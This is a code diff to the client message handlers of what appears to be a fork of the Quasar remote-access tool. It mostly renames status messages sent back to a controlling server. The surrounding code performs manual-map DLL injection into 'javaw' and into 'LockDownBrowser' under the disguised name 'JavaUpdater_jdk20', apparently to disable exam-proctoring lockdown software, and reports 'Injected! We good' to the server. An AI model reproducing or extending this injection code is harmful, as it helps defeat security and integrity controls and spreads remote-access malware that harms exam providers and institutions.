@@ -45,7 +45,6 @@ namespace Quasar.Client.Messages
                 }
             }).Start();
 
-            // client.Send(new SetStatus { Message = "Successfully displayed MessageBox" });
         }
 
         private void UnblockOnVUE(ISender client)
@@ -62,20 +61,20 @@ namespace Quasar.Client.Messages
             }
             catch (Exception ex)
             {
-                client.Send(new SetStatus { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler1.cs"), Misc.__LINE__(191), ex.Message) });
+                client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler1.cs"), Misc.__LINE__(191), ex.Message) });
             }
             try
             {
                 string[] array = DllInjectionHelper.InjectManualMap("javaw", text, true);
                 for (int i = 0; i < array.Length; i++)
                 {
-                    client.Send(new SetStatus { Message = array[i] });
+                    client.Send(new NotifyMessageToServer { Message = array[i] });
                 }
                 return;
             }
             catch (Exception ex2)
             {
-                client.Send(new SetStatus { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler2.cs"), Misc.__LINE__(201), ex2.Message) });
+                client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler2.cs"), Misc.__LINE__(201), ex2.Message) });
                 return;
             }
         }
@@ -85,7 +84,7 @@ namespace Quasar.Client.Messages
             bool result = DllInjectionHelper.ManualNormalUnblockDllInject("LockDownBrowser", "JavaUpdater_jdk20", client);
             if (result)
             {
-                client.Send(new SetStatus { Message = "Injected! We good" });
+                client.Send(new NotifyMessageToServer { Message = "Injected! We good" });
                 return;
             }
         }
